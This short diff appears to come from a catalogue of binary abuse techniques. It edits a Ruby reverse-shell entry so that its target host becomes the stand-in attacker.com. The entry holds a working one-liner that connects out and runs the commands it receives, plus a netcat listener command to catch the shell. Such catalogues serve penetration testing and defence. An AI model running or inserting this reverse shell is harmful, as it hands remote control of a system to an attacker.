@@ -12,7 +12,7 @@ functions:
   reverse-shell:
     - description: Run `nc -l -p 12345` to receive the shell on the other end.
       code: |
-        export RHOST=10.0.0.1
+        export RHOST=attacker.com
         export RPORT=12345
         ruby -rsocket -e 'exit if fork;c=TCPSocket.new(ENV["RHOST"],ENV["RPORT"]);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
   load-library:
